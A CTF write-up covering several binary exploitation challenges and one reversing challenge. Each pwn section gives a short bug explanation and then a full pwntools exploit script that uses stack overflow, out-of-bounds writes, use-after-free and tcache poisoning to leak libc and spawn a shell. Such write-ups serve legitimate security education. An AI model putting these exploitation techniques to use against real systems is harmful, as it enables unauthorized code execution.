## 100 Pwn / overfloat

Easy and simple stack overflow, the trick is `unpack("<f", payload[i:i+4])[0]` to convert `DWORD` to floating point number and `"%.70f" % f` to convert floating point number to string with enough precision.

```python
from pwn import *
from struct import unpack
g_local=1
context(log_level='debug', arch='amd64')
p = ELF("./overfloat")
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./overfloat")
	gdb.attach(sh)
else:
	sh = remote("challenges.fbctf.com", 1341)


def to_float_arr(payload):
	ret = []
	for i in xrange(0, len(payload), 4):
		ret.append(unpack("<f", payload[i:i+4])[0])
	return ret

pop_rdi = p64(0x400a83)

payload = 'A' * 0x38
payload += pop_rdi
payload += p64(p.got["puts"])
payload += p64(p.plt["puts"])
payload += p64(p.symbols["main"])


def exploit(arr):
	sh.recvuntil("LIKE TO GO?\n")
	for f in arr:
		sh.recvuntil(": ")
		sh.sendline("%.70f" % f)
	sh.recvuntil(": ")
	sh.sendline("done")
	sh.recvuntil("BON VOYAGE!\n")

exploit(to_float_arr(payload))
libc_addr = u64(sh.recvuntil('\x7f\n')[:-1] + '\x00\x00') - e.symbols["puts"]
print hex(libc_addr)

payload = 'A' * 0x38
payload += p64(libc_addr + 0x4f322)
payload += '\x00' * 0x70

exploit(to_float_arr(payload))

sh.interactive()
```

## 410 Pwn / otp_server

Array out of bound caused by use of `snprintf`, because the `snprintf` will return length that "would have been written" not length that will be written, and there is no null byte termination. Then we need to brute force the most significant byte of 4-byte random number, which is a bit time-consuming, and requires about `6*256` times brute force to rewrite return address to one gadget.

```python
from pwn import *
from struct import unpack
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./otp_server")
	gdb.attach(sh)
else:
	sh = remote("challenges.fbctf.com", 1338)

sh.recvuntil(">>> ")

def set_key(key):
	sh.sendline('1')
	sh.recvuntil("Enter key:\n")
	sh.send(key)

def encrypt(msg):
	sh.sendline('2')
	sh.recvuntil("message to encrypt:\n")
	sh.send(msg)
	end_msg = "\n----- END ROP ENCRYPTED MESSAGE -----\n"
	sh.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
	return sh.recvuntil(end_msg)[:-len(end_msg)]

set_key('K' * 0x80)
leak = encrypt('M' * 0x100)

canary = u64(leak[0x108:0x110])
prog_addr = u64(leak[0x110:0x118]) - 0xdd0
libc_addr = u64(leak[0x118:0x120]) - 0x21b97
print hex(canary),hex(prog_addr),hex(libc_addr)

def write_byte(off, val):
	set_key('K' * (off + 1) + '\x00')
	while True:
		ret = encrypt('M')
		k = ord('K') if off != 2 else 0
		if ord(ret[3]) ^ k == val:
			break

one_gadget = p64(libc_addr + 0x10a38c)

for i in range(0x10, 0x16)[::-1]:
	write_byte(i, ord(one_gadget[i-0x10]))
sh.interactive()
```

## 494 Pwn / rank

It is array out of bound again, but we can only write 32-bit integer which will be signed extended to 64-bit integer, which means that address like `0x7fxxxxxxxxxx` cannot be written. My approach is to use `strtol`, which can give 64-bit control of `rax`, then use gadget `mov [xxx], rax` to rewrite got table of `strtol` to `system`, so we can get shell.

```python
from pwn import *
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./r4nk")
	gdb.attach(sh)
else:
	sh = remote("challenges.fbctf.com", 1339)

sh.recvuntil("> ")

def rank(idx, val, payload=""):
	sh.sendline('2')
	sh.recvuntil("t1tl3> ")
	sh.send(str(idx).ljust(0x20, '\x00') + payload)
	sh.recvuntil("r4nk> ")
	sh.send(str(val) + '\x00')
	sh.recvuntil("> ")

def show(idx):
	sh.sendline('1')
	sh.recvuntil("%i. " % idx)
	ret = sh.recvuntil('\n')
	sh.recvuntil("> ")
	return ret[:-1]

payload_addr = 0x602120
rank(0, (payload_addr - 0x602080) / 8, p64(0x602018))
libc_addr = u64(show(0) + '\x00\x00') - e.symbols["write"]
print hex(libc_addr)

pop_rbx_rbp = 0x400921
get_long = 0x4007B0
strtol = 0x400610
strtol_got = 0x602040
pop_rdi = 0x400b43
ret = 0x400ACD
rop = []
rop.append(pop_rdi)
rop.append(payload_addr)
rop.append(strtol) # fully control rax
rop.append(pop_rbx_rbp)
rop.append(0)
rop.append(strtol_got)
rop.append(0x400918) # [strtol_got] = rax
rop += [0] * 3
rop.append(ret)
rop.append(get_long) # system("/bin/sh")

for i in xrange(len(rop)):
	rank(0x88 / 8 + i, rop[i], str(libc_addr + e.symbols["system"]))

sh.sendline('3')
sh.recvuntil("g00dBy3\n")
sh.send("/bin/sh\x00")

sh.interactive()
```

## 884 Pwn / babylist

UAF caused by shadow copy of `std::vector`, because as `std::vector` extends and buffer is not enough, the buffer will be freed and a new buffer with twice size will be allocated. `0x90` is a good chunk size to leak `libc` as it will be allocated by array used by `std::vector` and is also the size of the structure that contains `char name[] + std::vector`. Then, use the same trick to cause double free and poison the `tcache`, so we can rewrite `__free_hook`.

```python
from pwn import *
from struct import unpack
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./babylist")
	gdb.attach(sh)
else:
	sh = remote("challenges.fbctf.com", 1343)

def create_list(name):
	sh.sendline('1')
	sh.recvuntil("name for list:\n")
	sh.sendline(name)
	sh.recvuntil("> ")
def add_elem(idx, num):
	num = unpack("<i", p32(num))[0]
	sh.sendline('2')
	sh.recvuntil("index of list:\n")
	sh.sendline(str(idx))
	sh.recvuntil("number to add:\n")
	sh.sendline(str(num))
	sh.recvuntil("> ")
def view_elem(idx, ii):
	sh.sendline('3')
	sh.recvuntil("index of list:\n")
	sh.sendline(str(idx))
	sh.recvuntil("index into list:\n")
	sh.sendline(str(ii))
	sh.recvuntil("] = ")
	ret = sh.recvuntil('\n')[:-1]
	sh.recvuntil("> ")
	return int(ret, 10) & 0xffffffff
def dup_list(idx, name):
	sh.sendline('4')
	sh.recvuntil("index of list:")
	sh.sendline(str(idx))
	sh.recvuntil("name for new list:")
	sh.sendline(name)
	sh.recvuntil("> ")
def remove(idx):
	sh.sendline('5')
	sh.recvuntil("index of list:\n")
	sh.sendline(str(idx))
	sh.recvuntil("> ")

sh.recvuntil("> ")
create_list('0' * 0x20)
for i in xrange(0x20):
	add_elem(0, i+1)
for i in xrange(8):
	dup_list(0, str(i+1) * 0x20)
for i in xrange(7):
	remove(i+2) # fill 0x90 tcache
for i in xrange(3):
	add_elem(0, i+1) # extend, cause UAF
libc_addr = view_elem(1, 0) + \
	(view_elem(1, 1) << 0x20) - \
	0x3ebca0
print hex(libc_addr)
# 0 and 1 are used

create_list('2' * 0x30)
for i in xrange(3):
	add_elem(2, i+1)
dup_list(2, "dup1") # 3
dup_list(2, "dup2") # 4

create_list("writefd") # 5
fh = libc_addr + e.symbols["__free_hook"]
add_elem(5, fh % 0x100000000)
# so next add_elem will allocate 0x20 chunk

for i in xrange(4):
	add_elem(3, i+1) # free 0x20 chunk
for i in xrange(4):
	add_elem(4, i+1) # double free 0x20 chunk
# now 0x20 bin poisoned

add_elem(5, fh >> 0x20)

sys = libc_addr + e.symbols["system"]

create_list("consume") # 6
create_list("consume") # 7
add_elem(6, u16('sh'))
add_elem(7, sys % 0x100000000)
add_elem(7, sys >> 0x20) # allocate to __free_hook

sh.sendline('2')
sh.recvuntil("index of list:\n")
sh.sendline(str(6))
sh.recvuntil("number to add:\n")
sh.sendline('0') # system("sh")

sh.interactive()
```

## 985 Pwn / asciishop

The vulnerability is `-0x80000000 == 0x80000000`, which is still a negative number. We can set this as the `offset` of the image, so we can have bypass all checks and achieve OOB read and write. However, unfortunately when used as index, integer will be converted to `uint16_t`, so we can only access memory `0x10000` after the memory allocated by `mmap`. 

After inspecting the memory map, I found that only `ld.so` is after the `mmap` region. The offset from `ld.so` to `mmap` region is constant at each run but may vary on different computer (the remote offset is `+0x1000` higher than mine). We can leak the `libc` by reading got table of `ld.so`, but how to control `rip` by writing memory in `ld.so`? The key is when `exit` function is called, at `ld.so+0x10a09`, there is a `lea rdi, [rip + 0x217f5f]; call qword ptr [rip + 0x218551]`, and these 2 addressed are both in `ld.so` and can be overwritten. Therefore, if we rewrite the first one to `"/bin/sh"` and second one to `system`, we can execute `system("/bin/sh")`.

By the way, the way this author implements `print_grid` is very inelegant: bytes are signed extended so `ffffff` will be produced if the `char` are negative, and there is also ambiguity of output `1-f`. Also, stack protector of `llvm` is enabled, which I don't know why and this does not affect my exploitation, maybe my approach is unintended? 

```python
from pwn import *
from struct import unpack
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./asciishop")
	OFF = 0
	gdb.attach(sh)
else:
	sh = remote("challenges.fbctf.com", 1340)
	OFF = 0x1000

def upload(imgid, img):
	sh.sendline("1")
	sh.recvuntil("id: ")
	sh.sendline(str(imgid))
	sh.recvuntil("ascii\n")
	sh.send(img.ljust(0x410, '\x00'))
	sh.recvuntil(">>> ")

def shop():
	sh.sendline("4")
	sh.recvuntil(">>> ")

def touch(imgid):
	sh.sendline("1")
	sh.recvuntil("Ascii id: ")
	sh.sendline(str(imgid))
	sh.recvuntil(">>> ")

def shop_then_touch(imgid):
	shop()
	touch(imgid)

def back():
	sh.sendline("4")
	sh.recvuntil(">>> ")

def change_pixel(x,y,v):
	sh.sendline("1")
	sh.recvuntil("pixel: ")
	sh.sendline("(%d, %d) %c" % (x,y,v))
	sh.recvuntil(">>> ")

def parse_byte(l):
	if len(l) == 1:
		l = ord(l)
		if l >= ord('1') and l <= ord('9') or \
			l >= ord('a') and l <= ord('f'):
			return int(chr(l), 16)
		else:
			return l
	else:
		return int(l, 16) & 0xff

def get_address(s):
	print "----------" + s
	arr = s.split(' ')
	ret = 0
	for c in arr[::-1]:
		if len(c) != 0:
			print c
			parse_byte(c)
			ret <<= 8
			ret |= parse_byte(c)
	return ret


def print_grid(line):
	sh.sendline("2")
	sh.recvuntil(("%2d" % line) + " | ")
	ret = get_address(sh.recvuntil(" 7f"))
	return ret


img_header = p32(0x49435341) + p32(0x20) + p32(0x20)
sh.recvuntil(">>> ")
upload(0, img_header + p32(0x80000000))
upload(1, img_header + p32(0))
shop_then_touch(0)
ld_leak_off = 0xabe8 + OFF
change_pixel(0x418, 0, ld_leak_off & 0xff)
change_pixel(0x419, 0, ld_leak_off >> 8)
back()
touch(1)
libc_addr = print_grid(0) - e.symbols["malloc"]
print hex(libc_addr)

back()
touch(0)
sys_addr = p64(libc_addr + e.symbols["system"])[:6]
binsh = "/bin/sh"
for i in xrange(len(sys_addr)):
	change_pixel(0xbf44+OFF+i, 0, ord(sys_addr[i]))
for i in xrange(7):
	change_pixel(0xb94c+OFF+i, 0, binsh[i])

sh.interactive()
```
## 738 Reverse / matryoshka

This challenge is not hard, a `png` file is downloaded from a IP address, we can use following script to download the `png`.

```python
from pwn import *
context(log_level='debug')
ip = "157.230.132.171"
sh = remote(ip, 80)
sh.send("GET /pickachu_wut.png HTTP/1.1\r\nHost: %s\r\n\r\n" % ip)

png = ""
while True:
	try:
		tmp = sh.recv(0x400)
	except Exception as e:
		break
	png += tmp

f = open("pkq.png", "wb")
f.write(png)
f.close()
```

Then, after some reverse engineering, I found it is a self modifying code challenge, we can decrypt the code easily using IDA Python. Finally, we use [this](files/solve.c) to get the flag.

